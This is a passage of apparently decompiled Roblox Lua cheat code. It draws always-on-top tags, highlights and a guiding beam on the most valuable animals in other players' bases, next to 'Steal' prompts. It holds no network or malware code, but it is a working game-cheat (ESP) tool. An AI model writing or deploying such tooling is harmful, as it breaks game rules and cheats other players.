	local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
	tbl10[1] = colorKeypoint
	tbl10[2] = colorKeypoint2

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(184, 0, 18)))
		table.move(values, 1, values.n, 3, tbl10)
	end

	tbl9.Text = colorSequenceNew(tbl10)
	local colorSequenceNew2 = ColorSequence.new
	local tbl11 = {}
	local colorKeypoint3 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
	local colorKeypoint4 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
	tbl11[1] = colorKeypoint3
	tbl11[2] = colorKeypoint4

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 0, 3)))
		table.move(values, 1, values.n, 3, tbl11)
	end

	tbl9.Stroke = colorSequenceNew2(tbl11)
	tbl5[1] = tbl6
	tbl5[2] = tbl7
	tbl5[3] = tbl8
	tbl5[4] = tbl9
end

local ok

do
	local ok2, result = pcall(function()
		return require(ReplicatedStorage.Datas.Animals)
	end)

	ok = ok2 and type(result) == "table" and result or {}
end

local ok2

do
	local ok3, result = pcall(function()
		return require(ReplicatedStorage.Datas.Rarities)
	end)

	ok2 = ok3 and type(result) == "table" and result or {}
end

local ok3

do
	local ok4, result = pcall(function()
		return require(ReplicatedStorage.Datas.Mutations)
	end)

	ok3 = ok4 and type(result) == "table" and result or {}
end

local ok4

do
	local ok5, result = pcall(function()
		return require(ReplicatedStorage.Packages.Gradients)
	end)

	ok4 = ok5 and type(result) == "table" and result or nil
end

local matchMap
matchMap = {}
local flag8, connections2, kMap, n5, flag9, flag10, n6, enabledFlags, configMap, fn12
local formatCompact, getRootPart, fn13, fn14, fn15, fn16, fn17, fn18, fn19

do
	local ok5, result = pcall(function()
		return require(ReplicatedStorage.Datas.Traits)
	end)

	local ok6 = ok5 and type(result) == "table" and result or {}

	for k, v8 in pairs(ok6) do
		if type(v8) == "table" then
			v8.TraitKey = k

			if v8.Icon then
				local str = tostring(v8.Icon)
				matchMap[str] = v8
				local match = str:match("%d+")

				if match then
					matchMap[match] = v8
				end
			end
		end
	end

	flag8 = false
	connections2 = {}
	kMap = {}
	n5 = 1
	flag9 = false
	flag10 = false
	n6 = 1000000
	enabledFlags = { Name = true, Mutation = true, Value = true, Trails = true, Rarity = false }

	configMap = {
		["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
		["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
		["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
	}

	fn12 = function(arg)
		for _, v8 in ipairs(tbl5) do
			if arg < v8.Limit then
				return v8
			end
		end

		return tbl5[#tbl5]
	end

	local function fn20(arg)
		local v8 = ok[arg]
		if type(v8) == "table" and v8.Rarity then
			return tostring(v8.Rarity)
		end
		return nil
	end

	formatCompact = function(arg)
		if arg >= 1e9 then
			return string.format("$%.2fB/s", arg / 1e9)
		end

		if arg >= 1000000 then
			return string.format("$%.2fM/s", arg / 1000000)
		end

		if arg >= 1000 then
			return string.format("$%.1fK/s", arg / 1000)
		end
		return string.format("$%d/s", math.floor(arg))
	end

	local function fn21(arg, arg2)
		local debris = Workspace:FindFirstChild("Debris")

		if debris then
			local magnitude = nil
			local animalOverhead = nil

			for _, child in ipairs(debris:GetChildren()) do
				if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
					local animalOverhead2 = child:FindFirstChild("AnimalOverhead")
					local displayName = animalOverhead2 and animalOverhead2:FindFirstChild("DisplayName")

					if displayName and displayName:IsA("TextLabel") and displayName.Text == arg.Name then
						local magnitude2 = (child.Position - arg2.Position).Magnitude

						if not magnitude or magnitude2 < magnitude then
							magnitude = magnitude2
							animalOverhead = animalOverhead2
						end
					end
				end
			end

			if animalOverhead and magnitude and magnitude <= 14 then
				return animalOverhead
			end
		end

		return nil
	end

	local function fn22(arg)
		if arg.CachedOverhead and arg.CachedOverhead.Parent then
			return arg.CachedOverhead
		end
		local v8 = fn21(arg.Model, arg.Root)
		arg.CachedOverhead = v8
		return v8
	end

	local function fn23(arg, arg2, arg3)
		local arg32 = arg3 or fn21(arg, arg2)
		arg32 = arg32 and arg32:FindFirstChild("Mutation")
		if not (arg32 and arg32:IsA("TextLabel") and arg32.Visible) then
			return nil
		end
		local str = tostring(arg32.Text or "")
		if str == "" then
			return nil
		end

		local tbl9 = {
			Text = str,
			RichText = arg32.RichText == true,
			Color = arg32.TextColor3,
			Font = arg32.FontFace,
			StrokeColor = nil,
			Gradient = nil,
			SourceGrad = arg32:FindFirstChildOfClass("UIGradient"),
		}

		local uiStroke = arg32:FindFirstChildOfClass("UIStroke")

		if uiStroke then
			tbl9.StrokeColor = uiStroke.Color
		end

		if tbl9.SourceGrad then
			tbl9.Gradient = {
				Color = tbl9.SourceGrad.Color,
				Rotation = tbl9.SourceGrad.Rotation,
				Offset = tbl9.SourceGrad.Offset,
			}
		end

		return tbl9
	end

	local function fn24(arg)
		local n7

		if not (not arg or arg == "") then
			local match, match2 = arg:gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
			if not match then
				return nil
			end
			n7 = tonumber(match) or 0
			local str = match2:upper()

			if str == "K" then
				n7 *= 1000
			elseif str == "M" then
				n7 *= 1000000
			elseif str == "B" then
				n7 *= 1e9
			elseif str == "T" then
				n7 *= 1e12
			end
		end

		return n7
	end

	local function fn25(arg, arg2, arg3, arg4)
		local v8 = ok[arg]
		local n7 = type(v8) == "table" and tonumber(v8.Generation) or 0
		local n8

		if n7 <= 0 then
			n8 = fn24(arg4) or 0
		else
			local ok7 = arg2 and ok3 and ok3[arg2]
			local n9 = 1

			if ok7 then
				n9 = 1 + (tonumber(ok3[arg2].Modifier) or 0)
			end

			local ok8 = arg3 and ok6
			local flag11 = false

			if ok8 then
				for _, v9 in ipairs(arg3) do
					local v10 = ok6[v9] or ok6[v9:gsub("_", " ")]

					if v10 then
						if v9 == "Sleepy" or v10.Name == "Sleepy" then
							flag11 = true
						else
							n9 += tonumber(v10.MultiplierModifier) or 0
						end
					end
				end
			end

			n8 = math.round(n7 * n9 * (flag11 and 0.5 or 1))
			local v9 = fn24(arg4)
			if v9 and v9 > n8 then
				return v9
			end
			n8 = n8 > 0 and n8 or v9 or n7
		end

		return n8
	end

	local function fn26(arg, arg2, arg3)
		local list = {}
		local list2 = {}
		local matchMap2 = {}
		local tbl9 = {}

		local function fn27(arg4, arg5)
			if arg4 and not tbl9[arg4] then
				tbl9[arg4] = true
				table.insert(list2, arg4)
			end

			if arg5 and arg5 ~= "" and arg5 ~= "rbxassetid://110835412437000" then
				local match = tostring(arg5):match("%d+")
				local match2 = match or tostring(arg5)

				if not matchMap2[match2] then
					matchMap2[match2] = true
					local str = tostring(arg5)

					if not str:find("://") and match then
						str = "rbxassetid://" .. match
					end

					table.insert(list, str)
				end
			end
		end

		local arg32 = arg3 or fn21(arg, arg2)
		arg32 = arg32 and arg32:FindFirstChild("Traits")

		if arg32 and arg32.Visible then
			for _, child in ipairs(arg32:GetChildren()) do
				if child:IsA("ImageLabel") and child.Visible and child.Image and child.Image ~= "" then
					local str = tostring(child.Image)
					local match = str:match("%d+")
					local matchEntry = matchMap[str] or match and matchMap[match]

					if matchEntry then
						matchEntry = matchEntry.TraitKey or matchEntry.Display or matchEntry.Name
					end

					fn27(matchEntry, child.Image)
				end
			end
		end

		for _, child in ipairs(arg:GetChildren()) do
			local match = child.Name:match("^_Trait%.(.+)$")

			if match then
				local v8 = ok6[match] or ok6[match:gsub("_", " ")]
				fn27(match, v8 and v8.Icon)
			end
		end

		local attribute = arg:GetAttribute("Trait") or arg:GetAttribute("Traits")

		if attribute then
			local str = tostring(attribute)
			local v8 = ok6[str] or ok6[str:gsub("_", " ")]
			fn27(str, v8 and v8.Icon)
		end

		return #list > 0 and list or nil, #list2 > 0 and list2 or nil
	end

	getRootPart = function(arg)
		return arg:FindFirstChild("RootPart") or arg.PrimaryPart or arg:FindFirstChildWhichIsA("BasePart")
	end

	local function fn27(parent, layoutOrder, arg)
		local frame = Instance.new("Frame")
		frame.BackgroundTransparency = 1
		frame.LayoutOrder = layoutOrder
		frame.Size = UDim2.new(1, 0, 0, arg)
		frame.Parent = parent
		local textLabel = Instance.new("TextLabel")
		textLabel.BackgroundTransparency = 1
		textLabel.FontFace = font
		textLabel.Position = UDim2.fromOffset(1, 1)
		textLabel.Size = UDim2.fromScale(1, 1)
		textLabel.Text = ""
		textLabel.TextColor3 = Color3.fromRGB(12, 0, 2)
		textLabel.TextScaled = true
		textLabel.TextStrokeTransparency = 1
		textLabel.TextTransparency = 0.1
		textLabel.ZIndex = 2
		textLabel.Parent = frame
		local textLabel2 = Instance.new("TextLabel")
		textLabel2.BackgroundTransparency = 1
		textLabel2.FontFace = font
		textLabel2.Size = UDim2.fromScale(1, 1)
		textLabel2.Text = ""
		textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel2.TextScaled = true
		textLabel2.TextStrokeTransparency = 1
		textLabel2.ZIndex = 3
		textLabel2.Parent = frame
		local uiStroke = Instance.new("UIStroke")
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
		uiStroke.Color = Color3.fromRGB(0, 0, 0)
		uiStroke.LineJoinMode = Enum.LineJoinMode.Round

		uiStroke.Thickness = pcall(function()
			uiStroke.BorderOffset = UDim.new(0, 0)
			uiStroke.BorderStrokePosition = Enum.BorderStrokePosition.Outer
			uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
		end) and 0.05 or 1.6

		uiStroke.Transparency = 0.05
		uiStroke.Parent = textLabel2
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Rotation = 90
		uiGradient.Enabled = false
		uiGradient.Parent = uiStroke
		local uiGradient2 = Instance.new("UIGradient")
		uiGradient2.Rotation = 90
		uiGradient2.Enabled = false
		uiGradient2.Parent = textLabel2
		return { Holder = frame, Label = textLabel2, Shadow = textLabel, Stroke = uiStroke, StrokeGradient = uiGradient, TextGradient = uiGradient2 }
	end

	local function fn28(parent, layoutOrder, arg)
		local traitRow = Instance.new("Frame")
		traitRow.Name = "TraitRow"
		traitRow.BackgroundTransparency = 1
		traitRow.LayoutOrder = layoutOrder
		traitRow.Size = UDim2.new(1, 0, 0, arg)
		traitRow.Parent = parent
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.Padding = UDim.new(0, 3)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Parent = traitRow
		return { Holder = traitRow, Layout = uiListLayout, Icons = {}, CurrentKey = "" }
	end

	fn13 = function(adornee, adornee2)
		local brainrotTag = Instance.new("BillboardGui")
		brainrotTag.Name = "BrainrotTag"
		brainrotTag.Adornee = adornee2
		brainrotTag.AlwaysOnTop = true
		brainrotTag.ClipsDescendants = false
		brainrotTag.LightInfluence = 0
		brainrotTag.MaxDistance = math.huge
		brainrotTag.Size = UDim2.fromOffset(220, 95)
		brainrotTag.StudsOffsetWorldSpace = Vector3.new(0, 4.4, 0)
		brainrotTag.Parent = adornee2
		local frame = Instance.new("Frame")
		frame.BackgroundTransparency = 1
		frame.Size = UDim2.fromScale(1, 1)
		frame.Parent = brainrotTag
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
		uiListLayout.Parent = frame
		local v8 = fn21(adornee, adornee2)
		local text = v8 and v8:FindFirstChild("Generation") and v8.Generation.Text
		local text2 = v8 and v8:FindFirstChild("Mutation") and v8.Mutation.Visible and v8.Mutation.Text

		if not text2 then
			local attribute = adornee:GetAttribute("Mutation") or adornee:GetAttribute("__mutation")

			if attribute and tostring(attribute) ~= "" then
				text2 = tostring(attribute)
			end
		end

		local v9, v10 = fn26(adornee, adornee2)
		local v11 = fn25(adornee.Name, text2, v10, text)

		local tbl9 = {
			Model = adornee,
			Root = adornee2,
			Billboard = brainrotTag,
			Column = frame,
			RarityRow = fn27(frame, 0, 16),
			TraitRow = fn28(frame, 1, 18),
			MutationRow = fn27(frame, 2, 15),
			NameRow = fn27(frame, 3, 19),
			ValueRow = fn27(frame, 4, 16),
			Name = adornee.Name,
			Generation = v11,
		}

		tbl9.RarityRow.Label.RichText = true
		tbl9.MutationRow.Label.RichText = true
		tbl9.RarityRow.Holder.Visible = false
		tbl9.TraitRow.Holder.Visible = false
		local v12 = fn12(tbl9.Generation)
		tbl9.NameRow.TextGradient.Color = v12.Text
		tbl9.NameRow.TextGradient.Enabled = true
		tbl9.NameRow.StrokeGradient.Color = v12.Stroke
		tbl9.NameRow.StrokeGradient.Enabled = true
		tbl9.ValueRow.TextGradient.Enabled = false
		tbl9.ValueRow.StrokeGradient.Enabled = false
		tbl9.ValueRow.Label.TextColor3 = Color3.fromRGB(115, 255, 0)
		tbl9.ValueRow.Shadow.TextColor3 = Color3.fromRGB(18, 48, 0)
		tbl9.ValueRow.Stroke.Transparency = 0.3
		tbl9.NameRow.Label.Text = tbl9.Name
		tbl9.NameRow.Shadow.Text = tbl9.Name
		local formattedText = formatCompact(tbl9.Generation)
		tbl9.ValueRow.Label.Text = formattedText
		tbl9.ValueRow.Shadow.Text = formattedText
		local brainrotHighlight = Instance.new("Highlight")
		brainrotHighlight.Name = "BrainrotHighlight"
		brainrotHighlight.Adornee = adornee
		brainrotHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		brainrotHighlight.FillColor = v12.Outline
		brainrotHighlight.FillTransparency = 0.86
		brainrotHighlight.OutlineColor = v12.Outline
		brainrotHighlight.OutlineTransparency = 0.3
		brainrotHighlight.Enabled = false
		brainrotHighlight.Parent = adornee
		tbl9.Highlight = brainrotHighlight
		tbl9.BeamTint = v12.Outline
		return tbl9
	end

	fn14 = function(arg)
		local floor = math.floor
		local n7 = 95 * n5
		arg.Billboard.Size = UDim2.fromOffset(math.floor(220 * n5), floor(n7))
		arg.RarityRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(16 * n5))
		local n8 = math.floor(18 * n5)
		arg.TraitRow.Holder.Size = UDim2.new(1, 0, 0, n8)

		for _, icon in ipairs(arg.TraitRow.Icons) do
			icon.Size = UDim2.fromOffset(n8, n8)
		end

		arg.MutationRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(15 * n5))
		arg.NameRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(19 * n5))
		arg.ValueRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(16 * n5))
	end

	local function fn29(arg)
		if arg.RarityGradientCleanup then
			pcall(arg.RarityGradientCleanup)
			arg.RarityGradientCleanup = nil
		end

		arg.ActiveRarityEffect = nil
		arg.SourceRarityGrad = nil
		arg.SourceMutationGrad = nil
	end

	fn15 = function(arg, arg2)
		pcall(function()
			if not enabledFlags.Mutation then
				arg.MutationShown = false
				arg.MutationRow.Holder.Visible = false
				return
			end

			if arg2 < (arg.MutationCheckedAt or 0) then
				arg.MutationRow.Holder.Visible = arg.MutationShown == true
				return
			end
			arg.MutationCheckedAt = arg2 + 0.4
			local v8 = fn23(arg.Model, arg.Root, fn22(arg))

			if not v8 then
				arg.MutationShown = false
				arg.MutationRow.Holder.Visible = false
				arg.SourceMutationGrad = nil
				return
			end

			arg.MutationShown = true
			local mutationRow = arg.MutationRow
			mutationRow.Holder.Visible = true
			mutationRow.Label.RichText = v8.RichText
			mutationRow.Label.Text = v8.Text

			if v8.Color then
				mutationRow.Label.TextColor3 = v8.Color
			end

			if v8.Font then
				pcall(function()
					mutationRow.Label.FontFace = v8.Font
					mutationRow.Shadow.FontFace = v8.Font
				end)
			end

			if v8.StrokeColor then
				mutationRow.Stroke.Color = v8.StrokeColor
			end

			if v8.Gradient then
				pcall(function()
					mutationRow.TextGradient.Color = v8.Gradient.Color
					mutationRow.TextGradient.Rotation = v8.Gradient.Rotation
					mutationRow.TextGradient.Offset = v8.Gradient.Offset
					mutationRow.TextGradient.Enabled = true
				end)

				arg.SourceMutationGrad = v8.SourceGrad
			else
				mutationRow.TextGradient.Enabled = false
				arg.SourceMutationGrad = nil
			end

			mutationRow.Shadow.RichText = false
			mutationRow.Shadow.Text = v8.Text:gsub("<[^<>]->", "")
		end)
	end

	fn16 = function(arg, arg2)
		if not enabledFlags.Rarity then
			arg.RarityShown = false
			arg.RarityRow.Holder.Visible = false
			fn29(arg)
			return
		end

		if arg2 < (arg.RarityCheckedAt or 0) then
			arg.RarityRow.Holder.Visible = arg.RarityShown == true
			return
		end
		arg.RarityCheckedAt = arg2 + 0.5
		local text = fn20(arg.Model.Name)
		local v8 = fn22(arg)
		local rarity = v8 and v8:FindFirstChild("Rarity")

		if rarity and rarity:IsA("TextLabel") and rarity.Visible and rarity.Text ~= "" then
			text = rarity.Text
		end

		if not text or text == "" then
			arg.RarityShown = false
			arg.RarityRow.Holder.Visible = false
			fn29(arg)
			return
		end

		arg.RarityShown = true
		local rarityRow = arg.RarityRow
		rarityRow.Holder.Visible = true
		rarityRow.Label.Text = text
		rarityRow.Shadow.Text = text:gsub("<[^<>]->", "")
		local gradientPreset = ok2[text]
		gradientPreset = gradientPreset and gradientPreset.GradientPreset
		local flag11 = false

		pcall(function()
			if gradientPreset and ok4 and ok4.apply then
				if arg.ActiveRarityEffect ~= gradientPreset then
					if arg.RarityGradientCleanup then
						pcall(arg.RarityGradientCleanup)
						arg.RarityGradientCleanup = nil
					end

					arg.ActiveRarityEffect = gradientPreset

					local ok7, rarityGradientCleanup = pcall(function()
						return ok4.apply(rarityRow.Label, gradientPreset)
					end)

					if ok7 and typeof(rarityGradientCleanup) == "function" then
						arg.RarityGradientCleanup = rarityGradientCleanup
					end
				end

				pcall(function()
					rarityRow.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
				end)

				arg.SourceRarityGrad = nil
				flag11 = true
			end
		end)

		if not flag11 then
			pcall(function()
				if arg.RarityGradientCleanup then
					pcall(arg.RarityGradientCleanup)
					arg.RarityGradientCleanup = nil
				end

				arg.ActiveRarityEffect = nil
				local uiGradient = rarity and rarity:FindFirstChildOfClass("UIGradient")
				local uiStroke = rarity and rarity:FindFirstChildOfClass("UIStroke")

				if uiGradient then
					rarityRow.TextGradient.Color = uiGradient.Color
					rarityRow.TextGradient.Rotation = uiGradient.Rotation
					rarityRow.TextGradient.Offset = uiGradient.Offset
					rarityRow.TextGradient.Enabled = true
					arg.SourceRarityGrad = uiGradient
				else
					rarityRow.TextGradient.Enabled = false
					arg.SourceRarityGrad = nil
				end

				if uiStroke then
					rarityRow.Stroke.Color = uiStroke.Color
				else
					rarityRow.Stroke.Color = Color3.fromRGB(0, 0, 0)
				end

				if rarity and rarity.TextColor3 then
					rarityRow.Label.TextColor3 = rarity.TextColor3
				elseif text == "Mythic" then
					rarityRow.Label.TextColor3 = Color3.fromRGB(255, 0, 0)
				elseif text == "Legendary" or text == "Legend" then
					rarityRow.Label.TextColor3 = Color3.fromRGB(255, 175, 0)
				elseif text == "Epic" then
					rarityRow.Label.TextColor3 = Color3.fromRGB(134, 0, 171)
				elseif text == "Rare" then
					rarityRow.Label.TextColor3 = Color3.fromRGB(0, 131, 171)
				elseif text == "Common" then
					rarityRow.Label.TextColor3 = Color3.fromRGB(0, 171, 40)
				else
					rarityRow.Label.TextColor3 = Color3.fromRGB(130, 210, 255)
				end
			end)
		end
	end

	fn17 = function(arg, arg2)
		if not enabledFlags.Trails then
			arg.TraitRow.Holder.Visible = false
			return
		end

		if arg2 < (arg.TraitCheckedAt or 0) then
			arg.TraitRow.Holder.Visible = arg.TraitIcons ~= nil
			return
		end
		arg.TraitCheckedAt = arg2 + 0.5
		local v8, v9 = fn26(arg.Model, arg.Root, fn22(arg))
		arg.ActiveTraitNames = v9

		if not v8 then
			arg.TraitIcons = nil
			arg.TraitRow.Holder.Visible = false
			arg.TraitRow.CurrentKey = ""

			for _, icon in ipairs(arg.TraitRow.Icons) do
				icon.Visible = false
			end
		else
			arg.TraitIcons = v8
			arg.TraitRow.Holder.Visible = true
			local currentKey = table.concat(v8, "|")

			if arg.TraitRow.CurrentKey ~= currentKey then
				arg.TraitRow.CurrentKey = currentKey
				local n7 = math.floor(18 * n5)

				for idx = 1, #v8 do
					local icon = arg.TraitRow.Icons[idx]

					if not icon then
						icon = Instance.new("ImageLabel")
						icon.BackgroundTransparency = 1
						icon.ScaleType = Enum.ScaleType.Fit
						icon.ImageColor3 = Color3.fromRGB(255, 255, 255)
						icon.ZIndex = 3
						icon.Parent = arg.TraitRow.Holder
						arg.TraitRow.Icons[idx] = icon
					end

					icon.Image = v8[idx]
					icon.Size = UDim2.fromOffset(n7, n7)
					icon.LayoutOrder = idx
					icon.Visible = true
				end

				for idx = #v8 + 1, #arg.TraitRow.Icons do
					arg.TraitRow.Icons[idx].Visible = false
				end
			end
		end
	end

	fn18 = function(arg, arg2)
		if not (arg2 < (arg.GenerationCheckedAt or 0)) then
			arg.GenerationCheckedAt = arg2 + 0.4
			local mutation = fn22(arg)
			local text = mutation and mutation:FindFirstChild("Generation") and mutation.Generation.Text
			mutation = mutation and mutation:FindFirstChild("Mutation")
			local text2

			if mutation and mutation.Visible and mutation.Text ~= "" then
				text2 = mutation.Text
			else
				local attribute = arg.Model:GetAttribute("Mutation") or arg.Model:GetAttribute("__mutation")
				local attribute2 = attribute and tostring(attribute) ~= ""
				text2 = nil

				if attribute2 then
					text2 = tostring(attribute)
				end
			end

			local activeTraitNames = arg.ActiveTraitNames

			if not activeTraitNames then
				local v8
				v8, activeTraitNames = fn26(arg.Model, arg.Root)
				arg.ActiveTraitNames = activeTraitNames
			end

			local v8 = fn25(arg.Name, text2, activeTraitNames, text)

			if v8 ~= arg.Generation and v8 > 0 then
				arg.Generation = v8
				local formattedText = formatCompact(v8)
				arg.ValueRow.Label.Text = formattedText
				arg.ValueRow.Shadow.Text = formattedText
				local v9 = fn12(v8)
				arg.NameRow.TextGradient.Color = v9.Text
				arg.NameRow.StrokeGradient.Color = v9.Stroke
				arg.Highlight.FillColor = v9.Outline
				arg.Highlight.OutlineColor = v9.Outline
				arg.BeamTint = v9.Outline
			end
		end
	end

	fn19 = function(arg, arg2)
		if flag10 then
			return arg2
		end
		return (arg.Generation or 0) >= n6
	end

	local attachment = nil
	local attachment2 = nil
	local beam = nil
	local beam2 = nil
	local parent = nil
	local parent2 = nil

	local function fn30()
		pcall(function()
			if beam then
				beam:Destroy()
			end
		end)

		pcall(function()
			if beam2 then
				beam2:Destroy()
			end
		end)

		pcall(function()
			if attachment then
				attachment:Destroy()
			end
		end)

		pcall(function()
			if attachment2 then
				attachment2:Destroy()
			end
		end)

		beam = nil
		beam2 = nil
		attachment = nil
		attachment2 = nil
		parent = nil
		parent2 = nil
	end

	local function fn31(parent3, parent4)
		fn30()
		if not (parent3 and parent4) then
			return
		end
		attachment = Instance.new("Attachment")
		attachment.Name = "BrainrotBeamStart"
		attachment.Position = Vector3.new(0, 1, 0)
		attachment.Parent = parent3
		attachment2 = Instance.new("Attachment")
		attachment2.Name = "BrainrotBeamTarget"
		attachment2.Position = Vector3.new(0, 2.5, 0)
		attachment2.Parent = parent4
		local color = Color3.fromRGB(255, 25, 140)
		local color2 = Color3.fromRGB(255, 120, 220)
		local color3 = Color3.fromRGB(180, 35, 255)
		beam = Instance.new("Beam")
		beam.Name = "BrainrotBeamGlow"
		beam.Attachment0 = attachment
		beam.Attachment1 = attachment2
		beam.Color = ColorSequence.new(color, color3)
		beam.CurveSize0 = 1.8
		beam.CurveSize1 = -1.8
		beam.FaceCamera = true
		beam.LightEmission = 0.55
		beam.Segments = 20
		beam.Transparency = NumberSequence.new(0.65)
		beam.Width0 = 0.42
		beam.Width1 = 0.6
		weakCache[beam] = true
		beam.Parent = attachment
		beam2 = Instance.new("Beam")
		beam2.Name = "BrainrotBeamCore"
		beam2.Attachment0 = attachment
		beam2.Attachment1 = attachment2
		local beam3 = beam2
		local colorSequenceNew = ColorSequence.new
		local tbl9 = {}
		local colorKeypoint = ColorSequenceKeypoint.new(0, color)
		local colorKeypoint2 = ColorSequenceKeypoint.new(0.5, color2)
		local colorSequenceKeypointNew = ColorSequenceKeypoint.new
		tbl9[1] = colorKeypoint
		tbl9[2] = colorKeypoint2

		do
			local values = table.pack(colorSequenceKeypointNew(1, color3))
			table.move(values, 1, values.n, 3, tbl9)
		end

		beam3.Color = colorSequenceNew(tbl9)
		beam2.CurveSize0 = 1.8
		beam2.CurveSize1 = -1.8
		beam2.FaceCamera = true
		beam2.LightEmission = 0.6
		beam2.Segments = 20
		beam2.Transparency = NumberSequence.new(0.04)
		beam2.Width0 = 0.12
		beam2.Width1 = 0.22
		weakCache[beam2] = true
		beam2.Parent = attachment2
		parent = parent3
		parent2 = parent4
	end

	local function destroyAll(arg)
		fn29(arg)

		local function destroyAll2()
			arg.Billboard:Destroy()
		end

		pcall(destroyAll2)

		pcall(function()
			arg.Highlight:Destroy()
		end)

		if parent2 == arg.Root then
			fn30()
		end
	end

	local function fn32()
		for k, v8 in pairs(kMap) do
			destroyAll(v8)
			kMap[k] = nil
		end
	end

	local n7 = 14
	local v8 = nil
	local weakCache2 = setmetatable({}, { __mode = "k" })

	local function fn33(arg)
		if v8 and v8.Parent then
			return arg == v8
		end
		local plotSign = arg and arg:FindFirstChild("PlotSign")

		if plotSign then
			local str = string.lower(localPlayer.Name)
			local str2 = string.lower(localPlayer.DisplayName)

			for _, descendant in ipairs(plotSign:GetDescendants()) do
				if descendant:IsA("TextLabel") then
					local str3 = string.lower(tostring(descendant.Text or ""))
					if str3 == "your base" or string.find(str3, str, 1, true) or string.find(str3, str2, 1, true) then
						v8 = arg
						return true
					end
				end
			end
		end

		return false
	end

	local function fn34(arg, arg2)
		local v9 = weakCache2[arg]
		if v9 and v9.Parent and tostring(v9.ActionText) == "Steal" then
			return v9
		end
		weakCache2[arg] = nil

		for _, descendant in ipairs(arg2:GetDescendants()) do
			if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == "Steal" then
				weakCache2[arg] = descendant
				return descendant
			end
		end

		return nil
	end

	local function fn35(arg)
		local tbl9 = {}
		local animalPodiums = arg and arg:FindFirstChild("AnimalPodiums")

		if animalPodiums then
			for _, child in ipairs(animalPodiums:GetChildren()) do
				local base = child:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")

				if base and base:IsA("BasePart") then
					local v9 = fn34(child, base:FindFirstChild("PromptAttachment") or base)

					if v9 then
						local str = tostring(v9.ObjectText or "")

						if str ~= "" then
							local positions = tbl9[str]

							if not positions then
								positions = {}
								tbl9[str] = positions
							end

							positions[#positions + 1] = base.Position
						end
					end
				end
			end
		end

		return tbl9
	end

	local function fn36(arg, arg2)
		if not (arg and arg2) then
			return false
		end

		for _, v9 in ipairs(arg2) do
			if (arg.Position - v9).Magnitude <= n7 then
				return true
			end
		end

		return false
	end

	local function fn37()
		local plots2 = Workspace:FindFirstChild("Plots")
		if not plots2 then
			fn32()
			return
		end
		local childMap2 = {}

		for _, child in ipairs(plots2:GetChildren()) do
			if not fn33(child) then
				local v9 = fn35(child)

				for _, child2 in ipairs(child:GetChildren()) do
					if child2:IsA("Model") and ok[child2.Name] then
						local rootPart = getRootPart(child2)

						if fn36(rootPart, v9[child2.Name]) then
							childMap2[child2] = true
							local kEntry = kMap[child2]

							if kEntry and kEntry.Root ~= rootPart then
								destroyAll(kEntry)
								kEntry = nil
							end

							if not kEntry then
								local v10 = fn13(child2, rootPart)
								kMap[child2] = v10
								fn14(v10)
							end
						end
					end
				end
			end
		end

		for k, v9 in pairs(kMap) do
			if not childMap2[k] or not k.Parent then
				destroyAll(v9)
				kMap[k] = nil
			end
		end
	end

	local function fn38()
		if not flag8 then
			return
		end
		flag8 = false
		disconnectAll(connections2)
		fn30()
		fn32()
	end

	local function fn39()
		if flag8 then
			return
		end
		flag8 = true
		fn37()
		local n8 = 0

		connections2[#connections2 + 1] = RunService.RenderStepped:Connect(function()
			if flag8 then
				local now = os.clock()

				if n8 <= now then
					n8 = now + 1
					fn37()
				end

				local generation = nil
				local v9 = nil

				for _, v10 in pairs(kMap) do
					if v10.Root.Parent then
						local flag102 = flag10

						if not flag10 then
							flag102 = (v10.Generation or 0) >= n6
						end

						if flag102 and (not generation or v10.Generation > generation) then
							generation = v10.Generation
							v9 = v10
						end
					end
				end

				for _, v10 in pairs(kMap) do
					local v11 = fn19(v10, v10 == v9)
					v10.Billboard.Enabled = v11
					v10.Highlight.Enabled = v11

					if v11 then
						v10.NameRow.Holder.Visible = enabledFlags.Name
						v10.ValueRow.Holder.Visible = enabledFlags.Value
						pcall(fn16, v10, now)
						pcall(fn15, v10, now)
						pcall(fn17, v10, now)
						pcall(fn18, v10, now)

						if enabledFlags.Rarity and v10.SourceRarityGrad and v10.SourceRarityGrad.Parent then
							pcall(function()
								v10.RarityRow.TextGradient.Offset = v10.SourceRarityGrad.Offset
								v10.RarityRow.TextGradient.Rotation = v10.SourceRarityGrad.Rotation
								v10.RarityRow.TextGradient.Color = v10.SourceRarityGrad.Color
							end)
						end

						if enabledFlags.Mutation and v10.SourceMutationGrad and v10.SourceMutationGrad.Parent then
							pcall(function()
								v10.MutationRow.TextGradient.Offset = v10.SourceMutationGrad.Offset
								v10.MutationRow.TextGradient.Rotation = v10.SourceMutationGrad.Rotation
